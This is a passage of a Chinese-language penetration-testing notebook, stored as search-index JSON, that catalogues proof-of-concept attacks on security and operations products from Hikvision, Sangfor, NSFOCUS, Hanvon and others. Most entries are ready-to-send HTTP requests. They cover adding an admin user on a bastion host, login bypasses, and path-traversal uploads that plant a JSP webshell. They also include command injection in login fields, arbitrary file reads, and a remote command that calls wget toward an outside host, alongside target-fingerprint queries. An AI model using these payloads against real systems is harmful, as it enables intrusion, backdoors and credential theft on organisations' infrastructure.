\u70b9\u51fb\u53f3\u8fb9\u7684\u5730\u7403\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u684c\u9762\u4e86","title":"\u767b\u5f55\u8fdc\u7a0b\u684c\u9762"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_6","text":"\u8d44\u4ea7\u2192\u4e3b\u673a\u7ba1\u7406\u2192\u6700\u4e0b\u9762\uff1a\u5bfc\u51fa\u4e3b\u673a,\u91cc\u9762\u5c31\u4f1a\u6709\u5f88\u591a\u5bc6\u7801\u4fe1\u606f","title":"\u5bfc\u51fa\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_7","text":"","title":"\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_8","text":"POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1 Host: xxx Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 1121 <?xml version=\"1.0\"?> <methodCall> <methodName>web.user_add</methodName> <params> <param> <value> <array> <data> <value> <string>admin</string> </value> <value> <string>5</string> </value> <value> <string>XX.XX.XX.XX</string> </value> </data> </array> </value> </param> <param> <value> <struct> <member> <name>uname</name> <value> <string>deptadmin</string> </value> </member> <member> <name>name</name> <value> <string>deptadmin</string> </value> </member> <member> <name>pwd</name> <value> <string>Deptadmin@123</string> </value> </member> <member> <name>authmode</name> <value> <string>1</string> </value> </member> <member> <name>deptid</name> <value> <string></string> </value> </member> <member> <name>email</name> <value> <string></string> </value> </member> <member> <name>mobile</name> <value> <string></string> </value> </member> <member> <name>comment</name> <value> <string></string> </value> </member> <member> <name>roleid</name> <value> <string>101</string> </value> </member> </struct></value> </param> </params> </methodCall>","title":"\u5b89\u6052\u660e\u5fa1\u8fd0\u7ef4\u5ba1\u8ba1\u4e0e\u98ce\u9669\u63a7\u5236\u7cfb\u7edf\u5821\u5792\u673a\u4efb\u610f\u7528\u6237\u6ce8\u518c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94/","text":"\u5b9d\u5854","title":"\u5b9d\u5854"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94/#_1","text":"","title":"\u5b9d\u5854"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA/","text":"\u601d\u798f\u8fea \u76ee\u5f55 \u5821\u5792\u673a \u7528\u6237\u767b\u5f55poc \u5821\u5792\u673a title=\"Logbase\u8fd0\u7ef4\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\" && body=\"bhost\" \u7528\u6237\u767b\u5f55poc POST /bhost/set_session HTTP/1.1 Host: target u1=admin&m1={\"result\":true,\"info\":\"123123123\",\"ErrMsg\":\"\"} \u83b7\u53d6info\u5b57\u6bb5\u540e\u5e26\u5165\u5982\u4e0b\u8bf7\u6c42\u7684 a0 \u53c2\u6570\u503c\u4e2d,uCode\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d\uff1a POST /bhost/login_link HTTP/1.1 Host: target a0=123123123&a1=&a10=2020-01-01+10:10:10&ha=ABCDDDD11JJJAADDDCCC&uCode=admin&vdcode=","title":"\u601d\u798f\u8fea"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA/#_1","text":"","title":"\u601d\u798f\u8fea"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA/#_2","text":"\u5821\u5792\u673a \u7528\u6237\u767b\u5f55poc","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA/#_3","text":"title=\"Logbase\u8fd0\u7ef4\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\" && body=\"bhost\"","title":"\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA/#poc","text":"POST /bhost/set_session HTTP/1.1 Host: target u1=admin&m1={\"result\":true,\"info\":\"123123123\",\"ErrMsg\":\"\"} \u83b7\u53d6info\u5b57\u6bb5\u540e\u5e26\u5165\u5982\u4e0b\u8bf7\u6c42\u7684 a0 \u53c2\u6570\u503c\u4e2d,uCode\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d\uff1a POST /bhost/login_link HTTP/1.1 Host: target a0=123123123&a1=&a10=2020-01-01+10:10:10&ha=ABCDDDD11JJJAADDDCCC&uCode=admin&vdcode=","title":"\u7528\u6237\u767b\u5f55poc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/","text":"\u601d\u79d1\u7cfb \u76ee\u5f55 Cisco Unified Communications Manager \u7248\u672c\u67e5\u770b \u4fe1\u606f\u6cc4\u9732 cisco codec Cisco Unified Communications Manager \u5bf9\u601d\u79d1\u7535\u8bdd\u7cfb\u7edf\u8fdb\u884c\u7ba1\u7406\u7684\u5e73\u53f0 \u7248\u672c\u67e5\u770b /cucm-uds/version \u4fe1\u606f\u6cc4\u9732 x.x.x.x:6970/ConfigFileCacheList.txt /cucm-uds/users cisco codec \u89c6\u9891\u4f1a\u8bae\u7ec8\u7aef\u8bbe\u5907","title":"\u601d\u79d1\u7cfb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#_1","text":"","title":"\u601d\u79d1\u7cfb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#_2","text":"Cisco Unified Communications Manager \u7248\u672c\u67e5\u770b \u4fe1\u606f\u6cc4\u9732 cisco codec","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#cisco-unified-communications-manager","text":"\u5bf9\u601d\u79d1\u7535\u8bdd\u7cfb\u7edf\u8fdb\u884c\u7ba1\u7406\u7684\u5e73\u53f0","title":"Cisco Unified Communications Manager"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#_3","text":"/cucm-uds/version","title":"\u7248\u672c\u67e5\u770b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#_4","text":"x.x.x.x:6970/ConfigFileCacheList.txt /cucm-uds/users","title":"\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%80%9D%E7%A7%91%E7%B3%BB/%E6%80%9D%E7%A7%91%E7%B3%BB/#cisco-codec","text":"\u89c6\u9891\u4f1a\u8bae\u7ec8\u7aef\u8bbe\u5907","title":"cisco codec"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/","text":"\u6c49\u5f97srm \u8f6f\u4ef6\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edf\uff08Hanvon Software Resource Management System\uff09\u5e2e\u52a9\u4f01\u4e1a\u6709\u6548\u5730\u7ba1\u7406\u8f6f\u4ef6\u6388\u6743\u3001\u5b89\u88c5\u3001\u5347\u7ea7\u548c\u4f7f\u7528\u60c5\u51b5 tomcat.jsp \u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e POC /tomcat.jsp?dataName=role_id\\&dataValue=1 /tomcat.jsp?dataName=user_id\\&dataValue=1 \u7136\u540e\u8bbf\u95ee\u540e\u53f0\uff1a/main.screen","title":"\u6c49\u5f97srm"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/#srm","text":"\u8f6f\u4ef6\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edf\uff08Hanvon Software Resource Management System\uff09\u5e2e\u52a9\u4f01\u4e1a\u6709\u6548\u5730\u7ba1\u7406\u8f6f\u4ef6\u6388\u6743\u3001\u5b89\u88c5\u3001\u5347\u7ea7\u548c\u4f7f\u7528\u60c5\u51b5","title":"\u6c49\u5f97srm"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/#tomcatjsp-poc","text":"/tomcat.jsp?dataName=role_id\\&dataValue=1 /tomcat.jsp?dataName=user_id\\&dataValue=1 \u7136\u540e\u8bbf\u95ee\u540e\u53f0\uff1a/main.screen","title":"tomcat.jsp \u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/","text":"\u6d77\u5eb7\u5a01\u89c6 \u76ee\u5f55 HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 report \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 files \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC springboot\u4fe1\u606f\u6cc4\u9732 HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 report \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC POST /svm/api/external/report HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp\u7684\u9a6c%> ------WebKitFormBoundary9PggsiM755PLa54a-- \u9a6c\u513f\u8def\u5f84\uff1a/portal/ui/login/..;/..;/new.jsp HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 files \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC POST /center/api/files;.html HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp\u7684\u9a6c%> ------WebKitFormBoundary9PggsiM755PLa54a-- \u9a6c\u513f\u8def\u5f84\uff1a/portal/ui/login/..;/..;/new.jsp springboot\u4fe1\u606f\u6cc4\u9732 /artemis-portal/artemis/env","title":"\u6d77\u5eb7\u5a01\u89c6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#_1","text":"","title":"\u6d77\u5eb7\u5a01\u89c6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#_2","text":"HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 report \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 files \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC springboot\u4fe1\u606f\u6cc4\u9732","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#hikvision","text":"","title":"HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#hikvision-report-poc","text":"POST /svm/api/external/report HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp\u7684\u9a6c%> ------WebKitFormBoundary9PggsiM755PLa54a-- \u9a6c\u513f\u8def\u5f84\uff1a/portal/ui/login/..;/..;/new.jsp","title":"HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 report \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#hikvision-files-poc","text":"POST /center/api/files;.html HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp\u7684\u9a6c%> ------WebKitFormBoundary9PggsiM755PLa54a-- \u9a6c\u513f\u8def\u5f84\uff1a/portal/ui/login/..;/..;/new.jsp","title":"HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0 files \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/#springboot","text":"/artemis-portal/artemis/env","title":"springboot\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/","text":"\u6df1\u4fe1\u670d \u76ee\u5f55 \u5e94\u7528\u4ea4\u4ed8 \u6df1\u4fe1\u670d\u5e94\u7528\u4ea4\u4ed8\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC \u6df1\u4fe1\u670d\u62a5\u8868 \u6df1\u4fe1\u670d sxf-\u62a5\u8868\u7cfb\u7edf \u7248\u672c\u6709\u9650\u5236 \u5e94\u7528\u4ea4\u4ed8 \u6df1\u4fe1\u670d\u5e94\u7528\u4ea4\u4ed8\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC POST /rep/login Host:10.10.10.1:85 clsMode=cls_mode_login%0Als%0A\\&index=index\\&log_type=report\\&loginType=account\\&page=login\\&rnd=0\\&userID=admin\\&userPsw=123 \u6df1\u4fe1\u670d\u62a5\u8868 \u6df1\u4fe1\u670d sxf-\u62a5\u8868\u7cfb\u7edf \u7248\u672c\u6709\u9650\u5236 POC POST /rep/login HTTP/1.1 Host: URL Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq","title":"\u6df1\u4fe1\u670d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#_1","text":"","title":"\u6df1\u4fe1\u670d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#_2","text":"\u5e94\u7528\u4ea4\u4ed8 \u6df1\u4fe1\u670d\u5e94\u7528\u4ea4\u4ed8\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC \u6df1\u4fe1\u670d\u62a5\u8868 \u6df1\u4fe1\u670d sxf-\u62a5\u8868\u7cfb\u7edf \u7248\u672c\u6709\u9650\u5236","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#_3","text":"","title":"\u5e94\u7528\u4ea4\u4ed8"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#poc","text":"POST /rep/login Host:10.10.10.1:85 clsMode=cls_mode_login%0Als%0A\\&index=index\\&log_type=report\\&loginType=account\\&page=login\\&rnd=0\\&userID=admin\\&userPsw=123","title":"\u6df1\u4fe1\u670d\u5e94\u7528\u4ea4\u4ed8\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#_4","text":"","title":"\u6df1\u4fe1\u670d\u62a5\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/#sxf-","text":"POC POST /rep/login HTTP/1.1 Host: URL Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq","title":"\u6df1\u4fe1\u670d sxf-\u62a5\u8868\u7cfb\u7edf \u7248\u672c\u6709\u9650\u5236"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/","text":"\u7eff\u76df \u76ee\u5f55 \u5821\u5792\u673a SAS\u5821\u5792\u673a local_user.php \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e POC SAS\u5821\u5792\u673a GetFile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e POC SAS\u5821\u5792\u673a Exec \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC \u7eff\u76dfsas\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1ePOC NF \u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u5821\u5792\u673a body=\"'/needUsbkey.php?username='\" SAS\u5821\u5792\u673a local_user.php \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e POC GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close SAS\u5821\u5792\u673a GetFile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e POC GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close SAS\u5821\u5792\u673a Exec \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xx.xx HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 